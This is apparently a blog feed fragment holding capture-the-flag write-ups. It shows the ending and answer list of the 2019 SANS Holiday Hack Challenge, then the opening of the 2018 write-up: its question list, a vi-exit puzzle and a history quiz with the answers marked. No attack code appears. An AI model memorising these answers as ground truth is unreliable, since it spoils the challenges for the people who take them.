&lt;img alt="small_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" /&gt;
&lt;p&gt;&lt;em&gt;Krampus says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Congratulations on a job well done!&lt;/p&gt;
&lt;p&gt;Oh, by the way, I won the Frido Sleigh contest.&lt;/p&gt;
&lt;p&gt;I got 31.8% of the prizes, though I'll have to figure that out.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img alt="toothfairy_orange.png" class="align-center" src="/images/sans-christmas-challenge-2019/toothfairy_orange.png" /&gt;
&lt;p&gt;&lt;em&gt;The Tooth Fairy says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You foiled my dastardly plan! I’m ruined!&lt;/p&gt;
&lt;p&gt;And I would have gotten away with it too, if it weren't for you meddling
kids!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And, what is that we can see &lt;a class="reference external" href="https://downloads.elfu.org/LetterOfWintryMagic.pdf"&gt;in the corner&lt;/a&gt;...
Why, it's the letter of wintry magic we found during our reconnaissance of the
elfu.org domain! Here's what it says:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thankfully, I didn’t have to implement my plan by myself! Jack Frost&lt;/p&gt;
&lt;p&gt;promised to use his wintry magic to help me subvert Santa’s horrible reign&lt;/p&gt;
&lt;p&gt;of holiday merriment NOW and FOREVER!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Oh my, sounds like things aren't over yet...&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id43"&gt;Conclusion&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Well, that's it for this year's challenge! It was a ton of fun, with some
unexpected tasks, like cutting a key, and such. This year's challenge was
clearly designed to show the blue-team side of the equation, which is kind of
neat since it's not frequently shown in online challenges.&lt;/p&gt;
&lt;p&gt;Thanks a lot for the SANS team for a Supercalifragilisticexpialidocious
Christmas challenge, and see you next year!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="answer-to-the-questions"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id44"&gt;Answer to the questions&lt;/a&gt;&lt;/h2&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Someone sent a threatening letter to Elf University. What is the first word
in ALL CAPS in the subject line of the letter? Please find the letter in the
Quad.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The word is &lt;code&gt;DEMAND&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;We're seeing attacks against the Elf U domain! Using the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/Security.evtx.zip"&gt;event log data&lt;/a&gt;,
identify the user account that the attacker compromised using a password
spray attack.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The account compromised during the password spray attack is &lt;code&gt;supatree&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;Using &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/sysmon-data.json.zip"&gt;these normalized Sysmon logs&lt;/a&gt;,
identify the tool the attacker used to retrieve domain password hashes from
the lsass.exe process.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The attacker used the &lt;code&gt;ntdsutil&lt;/code&gt; program to extract hashes.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;The attacks don't stop! Can you help identify the IP address of the
malware-infected system using these &lt;a class="reference external" href="https://downloads.elfu.org/elfu-zeeklogs.zip"&gt;Zeek logs&lt;/a&gt;?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The IP address of the infected computer is &lt;code&gt;192.168.134.130&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;Access &lt;a class="reference external" href="https://splunk.elfu.org/"&gt;https://splunk.elfu.org/&lt;/a&gt; as &lt;code&gt;elf&lt;/code&gt; with password
&lt;code&gt;elfsocks&lt;/code&gt;. What was the message for Kent that the adversary embedded
in this attack? The SOC folks at that link will help you along!&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The message left for Kent was &lt;code&gt;Kent you are so unfair. And we were going
to make you the king of the Winter Carnival.&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;Gain access to the steam tunnels. Who took the turtle doves? Please tell us
their first and last name.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The turtle doves were taken by &lt;code&gt;Krampus Hollyfeld&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;Help Krampus beat the &lt;a class="reference external" href="https://fridosleigh.com/"&gt;Frido Sleigh contest&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Well, I did, and got the code &lt;code&gt;8Ia8LiZEwvyZr2WO&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="8"&gt;
&lt;li&gt;Gain access to the data on the &lt;a class="reference external" href="https://studentportal.elfu.org/"&gt;Student Portal&lt;/a&gt;
server and retrieve the paper scraps hosted there. What is the name of
Santa's cutting-edge sleigh guidance system?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Santa's seligh guidance system is called &lt;code&gt;Super Sled-o-matic&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic" start="9"&gt;
&lt;li&gt;&lt;p class="first"&gt;The Elfscrow Crypto tool is a vital asset used at Elf University for
encrypting SUPER SECRET documents. We can't send you the source, but we do
have debug symbols that you can use.&lt;/p&gt;
&lt;p&gt;Recover the plaintext content for this encrypted document. We know that it
was encrypted on December 6, 2019, between 7pm and 9pm UTC.&lt;/p&gt;
&lt;p&gt;What is the middle line on the cover page? (Hint: it's five words)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The middle line is &lt;code&gt;Machine Learning Sleigh Route Finder&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;Visit Shinny Upatree in the Student Union and help solve their problem.
What is written on the paper you retrieve for Shinny?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The name of this year's villain is written, &lt;code&gt;The Tooth Fairy&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="11"&gt;
&lt;li&gt;Use the data supplied in the Zeek JSON logs to identify the IP addresses of
attackers poisoning Santa's flight mapping software. &lt;a class="reference external" href="https://srf.elfu.org/"&gt;Block the 100
offending sources of information to guide Santa's sleigh&lt;/a&gt;
through the attack. Submit the Route ID (&amp;quot;RID&amp;quot;) success value that you're
given.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Route ID is &lt;code&gt;0807198508261964&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
</content></entry><entry><title>SANS Christmas Challenge 2018</title><link href="https://allyourbase.utouch.fr/posts/2019/01/14/sans-christmas-challenge-2018/" rel="alternate"></link><published>2019-01-14T00:00:00+01:00</published><updated>2019-01-14T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2019-01-14:/posts/2019/01/14/sans-christmas-challenge-2018/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2018_logo.png" class="align-center" src="/images/sans-christmas-challenge-2018/sans_christmas_challenge_2018_logo.png" /&gt;
&lt;p&gt;🎵 I'm dreaming of a pwned Christmaaaaas 🎵 As usual, here's my write-up
for the &lt;a class="reference external" href="https://holidayhackchallenge.com/2018/story.html"&gt;2018 SANS Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;div class="contents topic" id="table-of-contents"&gt;
&lt;p class="topic-title first"&gt;Table of contents&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#introduction" id="id5"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#orientation-challenge" id="id6"&gt;Orientation Challenge&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#bushy-evergreen-s-cranberry-pi-challenge" id="id7"&gt;Bushy Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#kringlecon-holiday-hack-history-questions" id="id8"&gt;KringleCon Holiday Hack History questions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#directory-browsing" id="id9"&gt;Directory Browsing&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#minty-candycane-s-cranberry-pi-challenge" id="id10"&gt;Minty Candycane's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#analyzing-the-kringlecon-cfp-website" id="id11"&gt;Analyzing the KringleCon CFP website&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#de-bruijn-sequences" id="id12"&gt;de Bruijn Sequences&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#tangle-coalbox-s-cranberry-pi-challenge" id="id13"&gt;Tangle Coalbox's …&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</summary><content type="html">&lt;img alt="sans_christmas_challenge_2018_logo.png" class="align-center" src="/images/sans-christmas-challenge-2018/sans_christmas_challenge_2018_logo.png" /&gt;
&lt;p&gt;🎵 I'm dreaming of a pwned Christmaaaaas 🎵 As usual, here's my write-up
for the &lt;a class="reference external" href="https://holidayhackchallenge.com/2018/story.html"&gt;2018 SANS Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;div class="contents topic" id="table-of-contents"&gt;
&lt;p class="topic-title first"&gt;Table of contents&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#introduction" id="id5"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#orientation-challenge" id="id6"&gt;Orientation Challenge&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#bushy-evergreen-s-cranberry-pi-challenge" id="id7"&gt;Bushy Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#kringlecon-holiday-hack-history-questions" id="id8"&gt;KringleCon Holiday Hack History questions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#directory-browsing" id="id9"&gt;Directory Browsing&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#minty-candycane-s-cranberry-pi-challenge" id="id10"&gt;Minty Candycane's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#analyzing-the-kringlecon-cfp-website" id="id11"&gt;Analyzing the KringleCon CFP website&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#de-bruijn-sequences" id="id12"&gt;de Bruijn Sequences&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#tangle-coalbox-s-cranberry-pi-challenge" id="id13"&gt;Tangle Coalbox's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#kringlecon-speaker-unpreparedness-room" id="id14"&gt;KringleCon Speaker Unpreparedness room&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#yannick-s-dirty-solution" id="id15"&gt;Yannick's (dirty) solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-official-solution" id="id16"&gt;The &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#data-repo-analysis" id="id17"&gt;Data Repo Analysis&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#wunorse-openslae-s-cranberry-pi-challenge" id="id18"&gt;Wunorse Openslae's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-git-repository" id="id19"&gt;North Pole Git Repository&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#ad-privilege-discovery" id="id20"&gt;AD Privilege Discovery&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#holly-evergreen-s-cranberry-pi-challenge" id="id21"&gt;Holly Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#sans-slingshot-linux-image" id="id22"&gt;SANS Slingshot Linux image&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#badge-manipulation" id="id23"&gt;Badge Manipulation&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#pepper-minstix-cranberry-pi-challenge" id="id24"&gt;Pepper Minstix' Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#bypassing-the-door-authentication-mechanism" id="id25"&gt;Bypassing the door authentication mechanism&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-haxxor-way" id="id26"&gt;The &amp;quot;haXXor&amp;quot; way&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#all-the-dead-ends-yay" id="id27"&gt;All the dead ends, yay!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-right-solution" id="id28"&gt;The right solution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-john-mcclane-way" id="id29"&gt;The &amp;quot;John McClane&amp;quot; way&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#hr-incident-response" id="id30"&gt;HR Incident Response&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#sparkle-redberry-s-cranberry-pi-challenge" id="id31"&gt;Sparkle Redberry's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#elf-infosec-careers-website" id="id32"&gt;Elf InfoSec Careers Website&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#network-traffic-forensics" id="id33"&gt;Network Traffic Forensics&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#sugarplum-mary-s-cranberry-pi-challenge" id="id34"&gt;SugarPlum Mary's Cranberry Pi Challenge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#packet-capture-and-analysis-website" id="id35"&gt;Packet Capture and Analysis Website&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#ransomware-recovery" id="id36"&gt;Ransomware Recovery&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#shiny-upatree-s-cranberry-pi-challenge" id="id37"&gt;Shiny Upatree's Cranberry Pi Challenge&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id1" id="id38"&gt;Yannick's (dirty) solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id2" id="id39"&gt;The &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#snort-rule" id="id40"&gt;Snort Rule&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#malware-dropper" id="id41"&gt;Malware Dropper&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#malware-analysis" id="id42"&gt;Malware Analysis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#memory-dump-analysis" id="id43"&gt;Memory Dump Analysis&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id3" id="id44"&gt;All the dead ends, yay!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id4" id="id45"&gt;The right solution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#who-is-behind-it-all" id="id46"&gt;Who Is Behind It All?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#answers-to-the-questions" id="id47"&gt;Answers to the questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#conclusion" id="id48"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#appendix-chocolate-chip-cookie-recipe" id="id49"&gt;Appendix: Chocolate Chip Cookie Recipe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id5"&gt;Introduction&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This year, we're invited by Santa to KringleCon! It's a security conference,
with several talks by renowned security professionals. Santa organized this
conference because of the security breaches that occured during these past
Christmases. He also decided to up the physical security, as we can see toy
soldiers patrolling. They seem to obey to some guy named &lt;a class="reference external" href="https://en.wikipedia.org/wiki/List_of_Die_Hard_characters#Hans_Gruber"&gt;Hans&lt;/a&gt;,
who is also here. Let's hope that things don't go awry this year!&lt;/p&gt;
&lt;img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome, my friends! Welcome to my castle! Would you come forward please?&lt;/p&gt;
&lt;p&gt;Welcome. It’s nice to have you here! I’m so glad you could come. This is
going to be such an exciting day!&lt;/p&gt;
&lt;p&gt;I hope you enjoy it. I think you will.&lt;/p&gt;
&lt;p&gt;Today is the start of KringleCon, our new conference for cyber security
practitioners and hackers around the world.&lt;/p&gt;
&lt;p&gt;KringleCon is designed to share tips and tricks to help leverage our skills
to make the world a better, safer place.&lt;/p&gt;
&lt;p&gt;Remember to look around, enjoy some talks by world-class speakers, and
mingle with our other guests.&lt;/p&gt;
&lt;p&gt;And, if you are interested in the background of this con, please check out
Ed Skoudis’ talk called &lt;a class="reference external" href="https://youtu.be/31JsKzsbFUo"&gt;START HERE&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Delighted to meet you. Overjoyed! Enraptured! Entranced! Are we ready? Yes!
In we go!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Here are the questions we must answer:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;What phrase is revealed when you answer all of the &lt;a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html"&gt;KringleCon Holiday Hack
History questions&lt;/a&gt;?&lt;/li&gt;
&lt;li&gt;Who submitted (First Last) the rejected talk titled &lt;strong&gt;Data Loss for Rainbow
Teams: A Path in the Darkness&lt;/strong&gt;?&lt;/li&gt;
&lt;li&gt;The KringleCon Speaker Unpreparedness room is a place for frantic speakers
to furiously complete their presentations. The room is protected by a door
passcode. Upon entering the correct passcode, what message is presented to
the speaker?&lt;/li&gt;
&lt;li&gt;Retrieve the encrypted ZIP file from the North Pole Git repository. What is
the password to open this file?&lt;/li&gt;
&lt;li&gt;Using the data set contained in this &lt;a class="reference external" href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova"&gt;SANS Slingshot Linux image&lt;/a&gt;,
find a reliable path from a Kerberoastable user to the Domain Admins group.
What’s the user’s logon name (in &lt;a class="reference external" href="mailto:username&amp;#64;domain.tld"&gt;username&amp;#64;domain.tld&lt;/a&gt; format)?&lt;/li&gt;
&lt;li&gt;Bypass the authentication mechanism associated with the room near Pepper
Minstix. &lt;a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg"&gt;A sample employee badge is available&lt;/a&gt;.
What is the access control number revealed by the &lt;a class="reference external" href="https://scanomatic.kringlecastle.com/index.html"&gt;door authentication
panel&lt;/a&gt;?&lt;/li&gt;
&lt;li&gt;Santa uses an Elf Resources website to look for talented information
security professionals. &lt;a class="reference external" href="https://careers.kringlecastle.com/"&gt;Gain access to the website&lt;/a&gt; and fetch the document
&lt;code&gt;C:\candidate_evaluation.docx&lt;/code&gt;. Which terrorist organization is
secretly supported by the job applicant whose name begins with &amp;quot;K&amp;quot;?&lt;/li&gt;
&lt;li&gt;Santa has introduced a &lt;a class="reference external" href="https://packalyzer.kringlecastle.com/"&gt;web-based packet capture and analysis tool&lt;/a&gt; to support the elves and their
information security work. Using the system, access and decrypt HTTP/2
network activity. What is the name of the song described in the document
sent from Holly Evergreen to Alabaster Snowball?&lt;/li&gt;
&lt;li&gt;Alabaster Snowball is in dire need of your help. Santa's file server has
been hit with malware. Help Alabaster Snowball deal with the malware on
Santa's server by completing several tasks. To start, assist Alabaster by
accessing (clicking) the snort terminal below. Then create a rule that will
catch all new infections. What is the success message displayed by the Snort
terminal?&lt;/li&gt;
&lt;li&gt;After completing the prior question, Alabaster gives you a document he
suspects downloads the malware. What is the domain name the malware in the
document downloads from?&lt;/li&gt;
&lt;li&gt;Analyze the full malware source code to find a kill-switch and activate it
at the North Pole's domain registrar &lt;a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html"&gt;HoHoHo Daddy&lt;/a&gt;. What is the full
sentence text that appears on the domain registration success message
(bottom sentence)?&lt;/li&gt;
&lt;li&gt;After activating the kill-switch domain in the last question, Alabaster
gives you a &lt;a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip"&gt;zip file&lt;/a&gt;
with a memory dump and encrypted password database. Use these files to
decrypt Alabaster's password database. What is the password entered in the
database for the Vault entry?&lt;/li&gt;
&lt;li&gt;Use what you have learned from previous challenges to open the &lt;a class="reference external" href="https://pianolockn.kringlecastle.com/"&gt;door to
Santa's vault&lt;/a&gt;. What message do
you get when you unlock the door?&lt;/li&gt;
&lt;li&gt;Who was the mastermind behind the whole KringleCon plan?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;As was done last year, we'll try not to rely on the hints given by the elves,
because it's more fun to try to find solutions in your own way. This is what
allows you to come up with creative solutions. So I'll post the solutions to
the Cranberry Pi challenges, but we won't use the hints that are given after
solving.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: I did use the hints for question 12, but not before I wasted
soooo much time exploring soooo many dead-ends. Fun!&lt;/p&gt;
&lt;p&gt;As usual, I'll try to detail my thought process as much as possible, including
dead-ends and mistakes (that's the best way to learn).&lt;/p&gt;
&lt;p&gt;Alright, let's get to it!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="orientation-challenge"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id6"&gt;Orientation Challenge&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="bushy-evergreen-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id7"&gt;Bushy Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Bushy Evergreen seems to be having problem with exiting his text editor. Can
you guess the editor?&lt;/p&gt;
&lt;pre class="literal-block"&gt;
                ........................................
             .;oooooooooooool;,,,,,,,,:loooooooooooooll:
           .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
         .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
       .''''''''''''''''''''''''''''''''''''''''';ooooo:
     ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
  .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
.cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
:llllllllllllll,'''''''';llllllllllllllc,

I'm in quite a fix, I need a quick escape.
Pepper is quite pleased, while I watch here, agape.
Her editor's confusing, though &amp;quot;best&amp;quot; she says - she yells!
My lesson one and your role is exit back to shellz.

-Bushy Evergreen

Exit vi.
&lt;/pre&gt;
&lt;p&gt;We appear to be in a &lt;code&gt;vi&lt;/code&gt;-edited document, and we have to exit
&lt;code&gt;vi&lt;/code&gt;. Luckily for me, that's also my editor of choice. First, you have
to make sure that you are in command mode, by pressing &lt;code&gt;Escape&lt;/code&gt;. Then,
you can simply exit &lt;code&gt;vi&lt;/code&gt; by typing &lt;code&gt;:q&lt;/code&gt;, followed by &lt;code&gt;Enter&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;What's more, if you press &lt;code&gt;Ctrl + C&lt;/code&gt; while in &lt;code&gt;vi&lt;/code&gt;, the following
message is displayed: &lt;code&gt;Type :quit&amp;lt;Enter&amp;gt; to exit Vim&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="kringlecon-holiday-hack-history-questions"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id8"&gt;KringleCon Holiday Hack History questions&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We are tasked with performing a little bit of &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Open-source_intelligence"&gt;OSINT&lt;/a&gt;
in order to answer some questions, regarding the three last SANS Christmas
Challenges. Fortunately, all the answers can be found in your favorite SANS
Christmas Challenge write-ups! The correct answers are marked, and I give you
a link to my past write-ups where the answers can be found. Alternatively, you
can find the answers in &lt;a class="reference external" href="https://www.youtube.com/watch?v=31JsKzsbFUo"&gt;Ed Skoudis' introduction video to KringleCon&lt;/a&gt;.&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;In 2015, the Dosis siblings asked for help understanding what piece of their
&amp;quot;Gnome in Your Home&amp;quot; toy?&lt;ol class="loweralpha"&gt;
&lt;li&gt;&lt;code&gt;[✓]&lt;/code&gt; Firmware (answer &lt;a class="reference external" href="/posts/2016/01/09/sans-christmas-challenge-2015/#part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit"&gt;here&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Clothing&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Wireless adapter&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Flux capacitor&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which
corporation?&lt;ol class="loweralpha"&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Elgnirk&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[✓]&lt;/code&gt; ATNAS (answer &lt;a class="reference external" href="/posts/2016/01/09/sans-christmas-challenge-2015/#part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt"&gt;here&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; GIYH&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Savvy, Inc.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;In 2016, participants were sent off on a problem-solving quest based on what
artifact that Santa left?&lt;ol class="loweralpha"&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Tom-tom drums&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; DNA on a mug of milk&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Cookie crumbs&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[✓]&lt;/code&gt; Business card (answer &lt;a class="reference external" href="/posts/2017/01/05/sans-christmas-challenge-2016/#part-1-a-most-curious-business-card"&gt;here&lt;/a&gt;)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;In 2016, Linux terminals at the North Pole could be accessed with what kind
of computer?&lt;ol class="loweralpha"&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Snozberry Pi&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt; Blueberry Pi&lt;/li&gt;
